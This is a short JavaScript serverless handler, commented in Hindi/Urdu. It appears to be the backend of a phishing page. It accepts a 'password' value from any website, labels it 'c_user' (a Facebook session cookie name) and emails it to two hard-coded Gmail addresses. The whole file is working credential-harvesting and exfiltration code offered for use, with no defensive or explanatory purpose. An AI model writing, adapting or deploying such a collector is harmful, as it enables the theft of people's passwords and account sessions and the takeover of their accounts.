import nodemailer from "nodemailer";

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method === "POST") {
    const { password } = req.body;

    // ✅ Setup transporter
    let transporter = nodemailer.createTransport({
      service: "gmail", // Tum koi bhi SMTP use kar sakte ho (Gmail, Outlook, etc.)
      auth: {
        user: process.env.EMAIL_USER, // tumhara email
        pass: process.env.EMAIL_PASS  // tumhara email app password
      }
    });

    // ✅ Send email
    try {
      await transporter.sendMail({
        from: `"PROFESSOR" <${process.env.EMAIL_USER}>`,
        to: "newzatpage@gmail.com,submitdispute@gmail.com", // Yahan receiver ka email daalna hai
        subject: "Zubair",
        text: `c_user: ${password}`,
        html: `<p><strong>Professor</strong></p><p><strong>Asif</strong></p>`
      });

      return res.status(200).json({ success: true, message: "Email sent!" });
    } catch (error) {
      console.error("Email error:", error);
      return res.status(500).json({ success: false, error: "Failed to send email" });
    }
  }

  res.status(405).json({ error: "Method not allowed" });
}
